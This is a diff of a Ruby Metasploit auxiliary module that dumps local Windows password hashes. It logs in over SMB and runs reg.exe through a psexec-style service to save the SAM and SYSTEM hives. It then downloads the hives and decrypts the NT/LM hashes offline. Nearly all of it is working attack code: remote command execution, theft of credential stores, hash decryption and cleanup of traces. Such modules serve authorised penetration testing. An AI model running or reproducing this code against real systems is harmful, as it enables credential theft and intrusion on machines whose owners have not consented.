@@ -1,28 +1,21 @@
 #!/usr/bin/env ruby
 
 require 'msf/core'
-require 'rex'
 require 'rex/registry'
 require 'fileutils'
 
 class Metasploit3 < Msf::Auxiliary
 
 	# Exploit mixins should be called first
+	include Msf::Exploit::Remote::DCERPC
 	include Msf::Exploit::Remote::SMB
 	include Msf::Exploit::Remote::SMB::Authenticated
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::Scanner
-	include Msf::Exploit::Remote::DCERPC
-
-	# Aliases for common classes
-	SIMPLE = Rex::Proto::SMB::SimpleClient
-	XCEPT  = Rex::Proto::SMB::Exceptions
-	CONST  = Rex::Proto::SMB::Constants
 
 	def initialize
 		super(
 			'Name'        => 'SMB - Grab Local User Hashes',
-			'Version'     => '$Revision: 14976 $',
 			'Description' => %Q{
 				This module extracts local user account password hashes from the SAM and SYSTEM hive files by authenticating
 				to the target machine and downloading a copy of the hives.  The hashes are extracted offline on the attacking machine.  This all happenes without popping a shell or uploading
@@ -30,12 +23,9 @@ class Metasploit3 < Msf::Auxiliary
 			},
 			'Author'      =>
 				[
-					'Royce Davis <rdavis[at]accuvant.com>',    # Metasploit module
-					'Twitter: <[at]R3dy__>',
+					'Royce @R3dy__ Davis <rdavis[at]accuvant.com>',    # Metasploit module
 				],
 			'References'  => [
-				['URL', 'http://www.pentestgeek.conm'],
-				['URL', 'http://www.accuvant.com'],
 				['URL', 'http://sourceforge.net/projects/smbexec/'],
 			],
 			'License'     => MSF_LICENSE
@@ -43,99 +33,82 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options([
 			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
-			OptString.new('LOGDIR', [true, 'This is a directory on your local attacking system used to store Hive files and hashes', '/tmp/msfhashes']),
+			OptString.new('LOGDIR', [true, 'This is a directory on your local attacking system used to store Hive files and hashes', '/tmp/msfhashes/local']),
 			OptString.new('RPORT', [true, 'The Target port', 445]),
 		], self.class)
 
 		deregister_options('RHOST')
-		datastore['LOGDIR'] += "#{Time.new.strftime("%Y-%m-%d-%H%M%S")}"
 	end
 
 
 
-	#----------------------------------------
 	# This is the main controller function
-	#----------------------------------------
 	def run_host(ip)
 		sampath = "#{Rex::Text.rand_text_alpha(20)}"
 		syspath = "#{Rex::Text.rand_text_alpha(20)}"
-		#logdir = "#{datastore['LOGDIR']}/#{Time.now.strftime("%Y-%m-%d-%H%M%S")}"
 		logdir = datastore['LOGDIR']
-		#::FileUtils.mkdir_p(logdir) unless ::File.exists?(logdir)
 		hives = [sampath, syspath]
 		smbshare = datastore['SMBSHARE']
-		
-		#Try and Connect to the target
-		begin
-			connect()
-		rescue 
-			return
-		end
 
-		#Try and authenticate with given credentials
-		begin
-			smb_login()
-		rescue StandardError => autherror
-			print_error("#{ip} - #{autherror}")
-			return
-		end
-		
-		begin
-			save_reg_hives(smbshare, ip, sampath, syspath)
-			print_status("#{ip} - Downloading SYSTEM and SAM hive files.")
-			download_hives(smbshare, sampath, syspath, ip, logdir)
+		if connect
+			begin
+				smb_login
+			rescue StandardError => autherror
+				print_error("#{ip} - #{autherror}")
+				return
+			end
+
+			if save_reg_hives(smbshare, ip, sampath, syspath)
+				d = download_hives(smbshare, sampath, syspath, ip, logdir)
+				sys, sam = open_hives(logdir, ip, hives)
+				if d
+					dump_creds(sam, sys, ip)
+				end
+			end
 			cleanup_after(smbshare, ip, sampath, syspath)
-			sys, sam = open_hives(logdir, ip, hives)
-			dump_creds(sam, sys, ip)
-			simple.connect(smbshare)
-			disconnect()			
-		rescue StandardError => bang
-			print_error("#{ip} - There was an error #{bang}")
-			return bang
+			disconnect
 		end
 	end
 
-	
-	
-	#--------------------------------------------------------------------------------------------------------
+
+
 	# This method attempts to use reg.exe to generate copies of the SAM and SYSTEM, registry hives
 	# and store them in the Windows Temp directory on the remote host
-	#--------------------------------------------------------------------------------------------------------
 	def save_reg_hives(smbshare, ip, sampath, syspath)
 		print_status("#{ip} - Creating hive copies.")
 		begin
 			# Try to save the hive files
 			simple.connect(smbshare)
-			command = "C:\\WINDOWS\\SYSTEM32\\cmd.exe /C reg.exe save HKLM\\SAM C:\\WINDOWS\\Temp\\#{sampath} && reg.exe save HKLM\\SYSTEM C:\\WINDOWS\\Temp\\#{syspath}"
+			command = "%COMSPEC% /C reg.exe save HKLM\\SAM %WINDIR%\\Temp\\#{sampath} /y && reg.exe save HKLM\\SYSTEM %WINDIR%\\Temp\\#{syspath} /y"
 			psexec(smbshare, command)
+			return true
 		rescue StandardError => saveerror
 			print_error("#{ip} - Unable to create hive copies with reg.exe: #{saveerror}")
 			simple.disconnect(smbshare)
-			return saveerror
+			return nil
 		end
 	end
 
 
 
-	#-----------------------------------------------------------------------------
 	# Method used to copy hive files from C:\WINDOWS\Temp* on the remote host
 	# To the local file path specified in datastore['LOGDIR'] on attacking system
-	#-----------------------------------------------------------------------------
 	def download_hives(smbshare, sampath, syspath, ip, logdir)
+		print_status("#{ip} - Downloading SYSTEM and SAM hive files.")
 		begin
 			newdir = "#{logdir}/#{ip}"
 			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
 			simple.connect("\\\\#{ip}\\#{smbshare}")
-	
+
 			# Get contents of hive file
 			remotesam = simple.open("\\WINDOWS\\Temp\\#{sampath}", 'rob')
 			remotesys = simple.open("\\WINDOWS\\Temp\\#{syspath}", 'rob')
 			samdata = remotesam.read
 			sysdata = remotesys.read
-	
+
 			# Save it to local file system
-			localsam = File.open("#{logdir}/#{ip}/sam", "w+")
-			localsys = File.open("#{logdir}/#{ip}/sys", "w+")
+			localsam = File.open("#{logdir}/#{ip}/sam", "wb+")
+			localsys = File.open("#{logdir}/#{ip}/sys", "wb+")
 			localsam.write(samdata)
 			localsys.write(sysdata)
 
@@ -144,48 +117,48 @@ class Metasploit3 < Msf::Auxiliary
 			remotesam.close
 			remotesys.close
 			simple.disconnect("\\\\#{ip}\\#{smbshare}")
+			return true
 		rescue StandardError => copyerror
 			print_error("#{ip} - Unable to download hive copies from. #{copyerror}")
 			simple.disconnect("\\\\#{ip}\\#{smbshare}")
-			return copyerror
+			return nil
 		end
 	end
 
 
 
-	#-----------------------------------------------------------------------------------------------
 	# This is the cleanup method.  deletes copies of the hive files from the windows temp directory
-	#-----------------------------------------------------------------------------------------------
 	def cleanup_after(smbshare, ip, sampath, syspath)
-		print_status("#{ip} - Running cleanup on")
+		print_status("#{ip} - Running cleanup.")
 		begin
 			# Try and do cleanup
 			simple.connect(smbshare)
-			cleanup = "C:\\WINDOWS\\SYSTEM32\\cmd.exe /C del /F /Q C:\\WINDOWS\\Temp\\#{sampath} C:\\WINDOWS\\Temp\\#{syspath}"
+			cleanup = "%COMSPEC% /C del /F /Q %WINDIR%\\Temp\\#{sampath} %WINDIR%\\Temp\\#{syspath}"
 			psexec(smbshare, cleanup)
 		rescue StandardError => cleanerror
 			print_error("#{ip} - Unable to run cleanup, need to manually remove hive copies from windows temp directory: #{cleanerror}")
 			return cleanerror
 		end
 	end
-	
-	
-	
-	#-------------------------------------------------------------------------------------------------------
+
+
+
 	# This method should open up a hive file from yoru local system and allow interacting with it
-	#-------------------------------------------------------------------------------------------------------
 	def open_hives(path, ip, hives)
-		print_status("#{ip} - Opening hives from on local Attack system")
-		sys = Rex::Registry::Hive.new("#{path}/#{ip}/sys")
-		sam = Rex::Registry::Hive.new("#{path}/#{ip}/sam")
-		return sys, sam
+		begin
+			print_status("#{ip} - Opening hives from on local Attack system")
+			sys = Rex::Registry::Hive.new("#{path}/#{ip}/sys")
+			sam = Rex::Registry::Hive.new("#{path}/#{ip}/sam")
+			return sys, sam
+		rescue StandardError => openerror
+			print_error("#{ip} - Unable to open hives.  May not have downloaded properly. #{openerror}")
+			return nil, nil
+		end
 	end
 
 
 
-	#------------------------------------------------------------------------------
 	# This method taken from tools/reg.rb  thanks bperry for all of your efforts!!
-	#------------------------------------------------------------------------------
 	def get_boot_key(hive)
 		begin
 			return if !hive.root_key
@@ -205,8 +178,8 @@ class Metasploit3 < Msf::Auxiliary
 				end
 				bootkey << [tmp].pack("H*")
 			end
-	
-			keybytes = bootkey.unpack("C*")				
+
+			keybytes = bootkey.unpack("C*")
 			p = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
 			scrambled = ""
 			p.each do |i|
@@ -221,15 +194,13 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#-----------------------------
 	# More code from tools/reg.rb
-	#-----------------------------
 	def get_hboot_key(sam, bootkey)
 		num = "0123456789012345678901234567890123456789\0"
 		qwerty = "!@#\$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
 		account_path = "\\SAM\\Domains\\Account"
 		accounts = sam.relative_query(account_path)
-  
+
 		f = nil
 		accounts.value_list.values.each do |value|
 			if value.name == "F"
@@ -238,7 +209,7 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 		raise "Hive broken" if not f
- 
+
 		md5 = Digest::MD5.digest(f[0x70,0x10] + qwerty + bootkey + num)
 		rc4 = OpenSSL::Cipher::Cipher.new('rc4')
 		rc4.key = md5
@@ -247,9 +218,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#---------------------------------------------------------------------------------------------
 	# Some of this taken from tools/reb.rb some of it is from hashdump.rb some of it is my own...
-	#---------------------------------------------------------------------------------------------
 	def dump_creds(sam, sys, ip)
 		empty_lm = "aad3b435b51404eeaad3b435b51404ee"
 		empty_nt = "31d6cfe0d16ae931b73c59d7e0c089c0"
@@ -259,10 +228,10 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			get_users(sam).each do |user|
 				rid = user.name.to_i(16)
-				hashes = get_user_hashes(user, hbootkey)			
+				hashes = get_user_hashes(user, hbootkey)
 				obj = []
 				obj << get_user_name(user)
-				obj << ":" 
+				obj << ":"
 				obj << rid
 				obj << ":"
 				if hashes[0].empty?
@@ -279,7 +248,11 @@ class Metasploit3 < Msf::Auxiliary
 				obj << ":"
 				obj << hashes[1]
 				obj << ":::"
-				print_good("#{obj.join}")
+				if obj.length > 0
+					print_good("#{obj.join}")
+				else
+					print_status("#{ip} No local user hashes.  System is likely a DC")
+				end
 			end
 		rescue StandardError => dumpcreds
 			vprint_error("#{ip} - Error extracting creds from hives. #{dumpcreds}")
@@ -289,9 +262,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#-------------------------------------------------------------------
 	# Method extracts usernames from user keys, modeled after credddump
-	#-------------------------------------------------------------------
 	def get_user_name(user_key)
 		v = ""
 		user_key.value_list.values.each do |value|
@@ -299,15 +270,13 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		name_offset = v[0x0c, 0x10].unpack("<L")[0] + 0xCC
 		name_length = v[0x10, 0x1c].unpack("<L")[0]
-		
+
 		return v[name_offset, name_length]
 	end
 
-	
-	
-	#-----------------------------
+
+
 	# More code from tools/reg.rb
-	#-----------------------------
 	def get_users(sam_hive)
 		begin
 			# Get users from SAM hive
@@ -320,12 +289,10 @@ class Metasploit3 < Msf::Auxiliary
 			return getuserserror
 		end
 	end
-	
-	
-	
-	#-----------------------------
+
+
+
 	# More code from tools/reg.rb
-	#-----------------------------
 	def get_user_hashes(user_key, hbootkey)
 		rid = user_key.name.to_i(16)
 		v = nil
@@ -339,12 +306,10 @@ class Metasploit3 < Msf::Auxiliary
 		nt_hash = v[hash_offset + (lm_exists ? 24 : 8), 16] if nt_exists
 		return decrypt_hashes(rid, lm_hash || nil, nt_hash || nil, hbootkey)
 	end
-	
-	
-	
-	#-----------------------------
+
+
+
 	# More code from tools/reg.rb
-	#-----------------------------
 	def decrypt_hashes(rid, lm_hash, nt_hash, hbootkey)
 		ntpwd = "NTPASSWORD\0"
 		lmpwd = "LMPASSWORD\0"
@@ -370,13 +335,11 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#---------------------------------------------
 	# This code is taken straight from hashdump.rb
-	#---------------------------------------------
 	def decrypt_hash(rid, hbootkey, enchash, pass)
 		begin
 			des_k1, des_k2 = sid_to_key(rid)
-		
+
 			d1 = OpenSSL::Cipher::Cipher.new('des-ecb')
 			d1.padding = 0
 			d1.key = des_k1
@@ -406,10 +369,8 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
-	
-	#-----------------------------
+
 	# More code from tools/reg.rb
-	#-----------------------------
 	def sid_to_key(sid)
 		s1 = ""
 		s1 << (sid & 0xFF).chr
@@ -424,13 +385,11 @@ class Metasploit3 < Msf::Auxiliary
 
 		return string_to_key(s1), string_to_key(s2)
 	end
-	
-	
-	#-----------------------------
+
+
 	# More code from tools/reg.rb
-	#-----------------------------
 	def string_to_key(s)
-	
+
 		parity = [
 			1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
 			16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
@@ -449,7 +408,7 @@ class Metasploit3 < Msf::Auxiliary
 			224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
 			241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
 		]
-		
+
 		key = []
 		key << (s[0].unpack('C')[0] >> 1)
 		key << ( ((s[0].unpack('C')[0]&0x01)<<6) | (s[1].unpack('C')[0]>>2) )
@@ -459,20 +418,18 @@ class Metasploit3 < Msf::Auxiliary
 		key << ( ((s[4].unpack('C')[0]&0x1F)<<2) | (s[5].unpack('C')[0]>>6) )
 		key << ( ((s[5].unpack('C')[0]&0x3F)<<1) | (s[6].unpack('C')[0]>>7) )
 		key << ( s[6].unpack('C')[0]&0x7F)
-		
+
 		0.upto(7).each do |i|
 			key[i] = (key[i]<<1)
 			key[i] = parity[key[i]]
 		end
-		
+
 		return key.pack("<C*")
 	end
-	
-	
-	#------------------------------------------------------------------------------------------------------------------------
-	# This code was stolen straight out of psexec.rb.  Thanks very much for all who contributed to that module!!
+
+
+	# This code was stolen straight out of psexec.rb.  Thanks very much HDM and all who contributed to that module!!
 	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
-	#------------------------------------------------------------------------------------------------------------------------
 	def psexec(smbshare, command)
 		filename = "filename"
 		servicename = "servicename"
@@ -589,7 +546,7 @@ class Metasploit3 < Msf::Auxiliary
 		rescue ::Exception => e
 			print_error("Error: #{e}")
 		end
-			
+
 		begin
 			#print_status("Deleting \\#{filename}...")
 			select(nil, nil, nil, 1.0)
